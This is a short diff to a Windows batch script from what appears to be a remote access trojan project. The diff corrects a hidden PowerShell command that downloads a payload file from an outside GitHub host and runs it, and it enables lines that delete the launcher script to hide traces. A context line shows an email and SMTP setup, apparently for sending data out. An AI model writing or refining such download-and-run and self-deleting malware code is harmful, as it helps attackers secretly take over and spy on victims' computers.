@@ -15,7 +15,7 @@ powershell -NoProfile -Command "$email='lukeosullivan123@gmail.com'; $smtpUser='
 
 pause
 @REM writeS payload to startup
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"
 
 
 @REM run payload placeholder
@@ -23,5 +23,5 @@ powershell ./wget.cmd
 pause
 
 
-@REM cd %initialPath%
-@REM del init.cmd
+ cd %initialPath%
+ del init.cmd
